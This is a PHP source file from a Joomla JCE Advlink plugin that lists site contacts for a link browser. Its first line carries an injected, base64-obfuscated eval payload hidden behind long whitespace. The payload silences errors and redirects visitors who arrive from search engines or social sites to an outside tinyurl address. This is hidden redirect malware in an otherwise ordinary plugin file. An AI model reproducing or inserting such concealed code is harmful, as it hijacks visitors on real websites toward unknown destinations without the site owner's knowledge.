<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: contact.php 88 2009-06-17 16:49:39Z happynoodleboy $
* @package      JCE Advlink
* @copyright    Copyright (C) 2008 - 2009 Ryan Demmer. All rights reserved.
* @author		Ryan Demmer
* @license      GNU/GPL
* JCE is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
*/
// no direct access
defined('_JCE_EXT') or die('Restricted access');
class AdvlinkContact 
{
	function getOptions()
	{
		//Reference to JConentEditor (JCE) instance
		$advlink =& AdvLink::getInstance();
		$list = '';
		if ($advlink->checkAccess('contacts', '1')) {	
			$list .= '<li id="index.php?option=com_contact"><div class="tree-row"><div class="tree-image"></div><span class="folder contact nolink"><a href="javascript:;">' . JText::_('CONTACTS') . '</a></span></div></li>';
		}
		return $list;	
	}
	function getItems($args)
	{
		$items 	= array();
		$view	= isset($args->view) ? $args->view : '';
		switch ($view) {
		default:
			$categories = AdvLink::getCategory('com_contact_details');
			foreach ($categories as $category) {
				$itemid 	= AdvLink::getItemId('com_contact', array('categories' => null, 'category' => $category->slug));
				$items[] 	= array(
					'id' 	=> 'index.php?option=com_contact&view=category&catid='. $category->slug . $itemid,
					'name' 	=> $category->title . ' / ' . $category->alias,
					'class'	=> 'folder contact'
				);
			}
			break;
		case 'category':
			$contacts = AdvlinkContact::_contacts($args->catid);
			foreach ($contacts as $contact) {
				$catid 		= $args->catid ? '&catid='. $args->catid : '';
				$itemid 	= AdvLink::getItemId('com_contact', array('categories' => null, 'category' => $catid));
				$items[] 	= array(
					'id' 	=> 'index.php?option=com_contact&view=contact'. $catid .'&id='.$contact->id . $itemid. '-' .$contact->alias,
					'name' 	=> $contact->name . ' / ' . $contact->alias,
					'class'	=> 'file'
				);
			}
			break;
		}
		return $items;
	}
	function _contacts($id)
	{
		$db		=& JFactory::getDBO();
		$user	=& JFactory::getUser();	
		
		$query	= 'SELECT id, name, alias'
		. ' FROM #__contact_details'
		. ' WHERE catid = '.(int) $id
		. ' AND published = 1'
		. ' AND access <= '.(int) $user->get('aid')
		//. ' GROUP BY id'
		. ' ORDER BY name'
		;
		$db->setQuery($query);
		return $db->loadObjectList();
	}
}
?>
